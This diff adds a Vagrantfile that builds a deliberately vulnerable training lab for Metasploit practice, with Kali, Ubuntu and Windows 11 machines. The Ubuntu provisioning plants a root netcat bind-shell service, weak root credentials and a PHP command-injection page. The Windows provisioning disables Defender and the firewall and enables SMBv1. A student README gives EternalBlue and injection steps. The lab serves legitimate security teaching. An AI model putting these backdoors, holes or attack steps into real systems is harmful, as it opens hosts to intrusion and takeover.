@@ -1,0 +1,377 @@
+# Scenario: hard-1 — Metasploit Exploitation
+# VMs: Kali Linux (attacker) + Ubuntu 22.04 (vulnerable target) + Windows 11 (target)
+# Windows 11 requires a manually packaged box — see README.
+#
+# Network: 192.168.59.0/24
+#   Kali    → 192.168.59.10
+#   Ubuntu  → 192.168.59.20
+#   Win11   → 192.168.59.30
+
+Vagrant.configure("2") do |config|
+
+  # ── Ubuntu vulnerable target ───────────────────────────────────────────
+  config.vm.define "ubuntu" do |ubuntu|
+    ubuntu.vm.box      = "ubuntu/jammy64"
+    ubuntu.vm.hostname = "vuln-target"
+
+    ubuntu.vm.network "private_network", ip: "192.168.59.20"
+
+    ubuntu.vm.provider "virtualbox" do |vb|
+      vb.name   = "cyberlab-hard1-ubuntu"
+      vb.memory = 1536
+      vb.cpus   = 2
+      vb.gui    = false
+      vb.customize ["modifyvm", :id, "--natdnshostresolver1", "on"]
+    end
+
+    ubuntu.vm.provision "shell", inline: <<-SHELL
+      export DEBIAN_FRONTEND=noninteractive
+      echo "[cyberlab] Setting up Metasploit target (Ubuntu)..."
+
+      apt-get update -qq
+      apt-get install -y -qq \
+        openssh-server \
+        vsftpd \
+        samba \
+        netcat-openbsd \
+        python3 \
+        apache2 \
+        php libapache2-mod-php \
+        nmap
+
+      # ── SSH: allow root + password auth (intentionally weak) ──────────
+      sed -i 's/^#*PasswordAuthentication.*/PasswordAuthentication yes/'  /etc/ssh/sshd_config
+      sed -i 's/^#*PermitRootLogin.*/PermitRootLogin yes/'               /etc/ssh/sshd_config
+      echo "root:toor" | chpasswd
+      id msfuser &>/dev/null || useradd -m -s /bin/bash msfuser
+      echo "msfuser:msfuser" | chpasswd
+      systemctl restart ssh
+
+      # ── FTP: vsftpd with anonymous write (misconfiguration) ───────────
+      cat > /etc/vsftpd.conf << 'EOF'
+listen=YES
+anonymous_enable=YES
+anon_upload_enable=YES
+anon_mkdir_write_enable=YES
+write_enable=YES
+local_enable=YES
+local_umask=022
+dirmessage_enable=YES
+use_localtime=YES
+xferlog_enable=YES
+connect_from_port_20=YES
+anon_root=/var/ftp/pub
+EOF
+      mkdir -p /var/ftp/pub
+      chmod 777 /var/ftp/pub
+      systemctl restart vsftpd
+      systemctl enable vsftpd
+
+      # ── Samba: world-readable share (misconfiguration) ─────────────────
+      cat > /etc/samba/smb.conf << 'EOF'
+[global]
+   workgroup = WORKGROUP
+   server string = Lab Server
+   security = user
+   map to guest = Bad User
+   dns proxy = no
+
+[public]
+   path = /srv/samba/public
+   browsable = yes
+   writable = yes
+   guest ok = yes
+   read only = no
+   create mask = 0777
+   directory mask = 0777
+EOF
+      mkdir -p /srv/samba/public
+      chmod 0777 /srv/samba/public
+      echo "Flag: MSF-EXPLOIT-COMPLETE" > /srv/samba/public/README.txt
+      systemctl restart smbd nmbd
+      systemctl enable smbd nmbd
+
+      # ── Apache + PHP: simple vulnerable web app ───────────────────────
+      cat > /var/www/html/index.php << 'EOF'
+<?php
+// Intentionally vulnerable to command injection
+$host = $_GET['host'] ?? '127.0.0.1';
+echo "<h2>Network Diagnostic Tool</h2>";
+echo "<form>Host: <input name='host' value='" . htmlspecialchars($host) . "'> <input type='submit' value='Ping'></form>";
+// VULNERABLE: unsanitised shell input
+$output = shell_exec("ping -c 2 " . $host . " 2>&1");
+echo "<pre>" . htmlspecialchars($output) . "</pre>";
+?>
+EOF
+      systemctl restart apache2
+      systemctl enable apache2
+
+      # ── Netcat backdoor listener on port 4444 (intentional) ───────────
+      # Simulates a bind-shell left by a previous attacker
+      cat > /usr/local/bin/cyberlab-backdoor.sh << 'EOF'
+#!/bin/bash
+while true; do
+  nc -lvnp 4444 -e /bin/bash 2>/dev/null
+  sleep 2
+done
+EOF
+      chmod +x /usr/local/bin/cyberlab-backdoor.sh
+
+      cat > /etc/systemd/system/cyberlab-backdoor.service << 'EOF'
+[Unit]
+Description=CyberLab bind shell (intentional vulnerability)
+After=network.target
+
+[Service]
+ExecStart=/usr/local/bin/cyberlab-backdoor.sh
+Restart=always
+User=root
+
+[Install]
+WantedBy=multi-user.target
+EOF
+      systemctl daemon-reload
+      systemctl enable cyberlab-backdoor.service
+      systemctl start  cyberlab-backdoor.service
+
+      # ── Proof flag (root access required) ─────────────────────────────
+      echo "Flag: MSF-EXPLOIT-COMPLETE" > /root/proof.txt
+      chmod 600 /root/proof.txt
+
+      echo "[cyberlab] hard-1 Ubuntu target ready."
+      echo "[cyberlab] Open ports: SSH(22) FTP(21) Samba(445) HTTP(80) Bindshell(4444)"
+      echo "[cyberlab] Root password: toor"
+      echo "[cyberlab] Snapshot: VBoxManage snapshot cyberlab-hard1-ubuntu take scenario-msf-ubuntu --pause"
+    SHELL
+  end
+
+  # ── Windows 11 target ─────────────────────────────────────────────────
+  config.vm.define "windows11" do |win|
+    win.vm.box      = "cyberlab/windows11"
+    win.vm.hostname = "win-target"
+
+    win.vm.network "private_network", ip: "192.168.59.30"
+
+    win.vm.communicator = "winssh"
+    win.vm.boot_timeout = 600
+
+    win.vm.provider "virtualbox" do |vb|
+      vb.name   = "cyberlab-hard1-windows11"
+      vb.memory = 4096
+      vb.cpus   = 2
+      vb.gui    = true
+      vb.customize ["modifyvm", :id, "--natdnshostresolver1", "on"]
+      vb.customize ["modifyvm", :id, "--vram", "128"]
+    end
+
+    win.vm.provision "shell", privileged: true, powershell_elevated_interactive: false, inline: <<-PS
+      Write-Host "[cyberlab] Configuring Windows 11 exploitation target..."
+
+      # ── Disable Windows Defender and Firewall for lab ─────────────────
+      Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
+      Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
+
+      # ── Enable SMBv1 (EternalBlue target — lab only!) ─────────────────
+      # Note: SMBv1 is intentionally enabled for educational exploitation exercise
+      Enable-WindowsOptionalFeature -Online -FeatureName SMB1Protocol -NoRestart -ErrorAction SilentlyContinue
+      Set-SmbServerConfiguration -EnableSMB1Protocol $true -Force -ErrorAction SilentlyContinue
+
+      # ── Create a weak local admin account ─────────────────────────────
+      $username = "labuser"
+      $password = ConvertTo-SecureString "Password123" -AsPlainText -Force
+      if (-not (Get-LocalUser -Name $username -ErrorAction SilentlyContinue)) {
+        New-LocalUser -Name $username -Password $password -FullName "Lab User" -Description "CyberLab target account"
+        Add-LocalGroupMember -Group "Administrators" -Member $username
+      }
+
+      # ── Write the flag ────────────────────────────────────────────────
+      New-Item -ItemType Directory -Path "C:\\Users\\labuser\\Desktop" -Force | Out-Null
+      Set-Content -Path "C:\\proof.txt" -Value "Flag: MSF-EXPLOIT-COMPLETE"
+      Set-Content -Path "C:\\Users\\labuser\\Desktop\\proof.txt" -Value "Flag: MSF-EXPLOIT-COMPLETE"
+
+      # ── Enable WinRM for Vagrant communication ────────────────────────
+      winrm quickconfig -q -ErrorAction SilentlyContinue
+
+      Write-Host "[cyberlab] Windows 11 target ready."
+      Write-Host "[cyberlab] SMBv1 enabled. Local admin: labuser / Password123"
+      Write-Host "[cyberlab] Flag at C:\\proof.txt"
+      Write-Host "[cyberlab] Snapshot: VBoxManage snapshot cyberlab-hard1-windows11 take scenario-msf-win11 --pause"
+    PS
+  end
+
+  # ── Kali attacker (Metasploit) ─────────────────────────────────────────
+  config.vm.define "kali" do |kali|
+    kali.vm.box      = "kalilinux/rolling"
+    kali.vm.hostname = "kali-msf"
+
+    kali.vm.network "private_network", ip: "192.168.59.10"
+
+    kali.vm.provider "virtualbox" do |vb|
+      vb.name   = "cyberlab-hard1-kali"
+      vb.memory = 4096
+      vb.cpus   = 2
+      vb.gui    = true
+      vb.customize ["modifyvm", :id, "--natdnshostresolver1", "on"]
+      vb.customize ["modifyvm", :id, "--vram", "32"]
+    end
+
+    kali.vm.provision "shell", inline: <<-SHELL
+      export DEBIAN_FRONTEND=noninteractive
+      echo "[cyberlab] Setting up Metasploit Exploitation — Kali attacker..."
+
+      apt-get update -qq
+      apt-get install -y -qq \
+        metasploit-framework \
+        nmap \
+        smbclient \
+        enum4linux \
+        impacket-scripts \
+        netcat-openbsd \
+        curl wget \
+        wordlists \
+        exploitdb
+
+      # Decompress rockyou
+      if [ ! -f /usr/share/wordlists/rockyou.txt ]; then
+        gunzip -k /usr/share/wordlists/rockyou.txt.gz 2>/dev/null || true
+      fi
+
+      # ── Initialise Metasploit database ────────────────────────────────
+      systemctl start postgresql
+      systemctl enable postgresql
+      msfdb init 2>/dev/null || true
+
+      # ── Pre-create the workspace and targets file ──────────────────────
+      mkdir -p /root
+
+      cat > /root/targets.txt << 'EOF'
+=== CyberLab — hard-1 Target List ===
+
+Ubuntu Linux target:  192.168.59.20
+  Open ports: 21 (FTP), 22 (SSH), 80 (HTTP), 445 (SMB), 4444 (bind shell)
+  Root password: toor
+  Suggested: bind shell (port 4444), FTP anonymous write, SSH brute force
+
+Windows 11 target:    192.168.59.30
+  SMBv1 enabled — try EternalBlue (ms17_010)
+  Local admin: labuser / Password123
+  Suggested: ms17_010_eternalblue, psexec
+
+Quick start:
+  nmap -sV -p- 192.168.59.20
+  nmap -sV --script smb-vuln* 192.168.59.30
+EOF
+
+      # ── Metasploit resource script (run with: msfconsole -r ~/msf_setup.rc) ──
+      cat > /root/msf_setup.rc << 'EOF'
+workspace -a capstone
+setg LHOST 192.168.59.10
+setg LPORT 4444
+
+# Ubuntu — quick bind shell
+use exploit/multi/handler
+set payload linux/x86/shell_bind_tcp
+set RHOST 192.168.59.20
+set RPORT 4444
+# run
+
+# Ubuntu — SSH login
+# use auxiliary/scanner/ssh/ssh_login
+# set RHOSTS 192.168.59.20
+# set USERNAME root
+# set PASSWORD toor
+# run
+
+# Windows — EternalBlue
+# use exploit/windows/smb/ms17_010_eternalblue
+# set RHOSTS 192.168.59.30
+# set payload windows/x64/meterpreter/reverse_tcp
+# run
+EOF
+
+      chown root:root /root/targets.txt /root/msf_setup.rc
+
+      # ── Practice directory ─────────────────────────────────────────────
+      mkdir -p /home/vagrant/practice
+      cat > /home/vagrant/practice/README.txt << 'EOF'
+========================================================
+  CyberLab — Scenario 5: Metasploit Exploitation
+========================================================
+
+See /root/targets.txt for target details.
+
+--- Step 1: Recon ---
+  nmap -A -p- 192.168.59.20
+  nmap -sV --script smb-vuln* 192.168.59.30
+
+--- Step 2: Launch Metasploit ---
+  msfconsole
+  workspace capstone       (or: msfconsole -r ~/msf_setup.rc)
+  setg LHOST 192.168.59.10
+
+--- Step 3: Exploit Ubuntu ---
+  Option A — Existing bind shell:
+    nc 192.168.59.20 4444
+    (you get a root shell immediately)
+
+  Option B — SSH:
+    use auxiliary/scanner/ssh/ssh_login
+    set RHOSTS 192.168.59.20
+    set USERNAME root
+    set PASSWORD toor
+    run
+
+  Option C — Command injection via web:
+    curl "http://192.168.59.20/?host=127.0.0.1;id"
+
+--- Step 4: Exploit Windows ---
+  use exploit/windows/smb/ms17_010_eternalblue
+  set RHOSTS 192.168.59.30
+  set payload windows/x64/meterpreter/reverse_tcp
+  set LHOST 192.168.59.10
+  exploit
+
+--- Flag ---
+Ubuntu: cat /root/proof.txt   (requires root)
+Windows: type C:\\proof.txt
+EOF
+
+      chown -R vagrant:vagrant /home/vagrant/practice
+
+      # ── Desktop shortcuts ──────────────────────────────────────────────
+      mkdir -p /home/vagrant/Desktop
+
+      cat > /home/vagrant/Desktop/Launch_msfconsole.desktop << 'EOF'
+[Desktop Entry]
+Version=1.0
+Type=Application
+Name=Metasploit Console
+Comment=Launch msfconsole with capstone workspace
+Exec=bash -c "msfconsole -r /root/msf_setup.rc; bash"
+Icon=kali-metasploit
+Terminal=true
+Categories=Network;Security;
+EOF
+      chmod +x /home/vagrant/Desktop/Launch_msfconsole.desktop
+
+      cat > /home/vagrant/Desktop/Open_Terminal.desktop << 'EOF'
+[Desktop Entry]
+Version=1.0
+Type=Application
+Name=Terminal
+Exec=xfce4-terminal
+Icon=utilities-terminal
+Terminal=false
+Categories=Utility;
+EOF
+      chmod +x /home/vagrant/Desktop/Open_Terminal.desktop
+      chown -R vagrant:vagrant /home/vagrant/Desktop
+
+      echo "[cyberlab] hard-1 Kali provisioning complete."
+      echo "[cyberlab] Targets: 192.168.59.20 (Ubuntu) | 192.168.59.30 (Windows 11)"
+      echo "[cyberlab] Quick start: msfconsole -r ~/msf_setup.rc"
+      echo "[cyberlab] Snapshot: VBoxManage snapshot cyberlab-hard1-kali take scenario-msf-kali --pause"
+    SHELL
+  end
+
+end
